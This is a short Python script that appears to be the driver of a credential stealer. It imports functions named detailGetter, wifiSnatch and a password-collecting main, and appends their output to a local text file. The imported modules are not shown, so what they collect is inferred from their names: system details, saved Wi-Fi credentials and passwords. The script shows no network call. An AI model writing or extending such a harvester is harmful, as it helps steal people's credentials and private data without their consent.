from details import detailGetter
from wifi import wifiSnatch
from passwords import main

f = open("file269446.txt", "a")
f.write(detailGetter())
f.write(wifiSnatch())
f.write(main())
f.close()

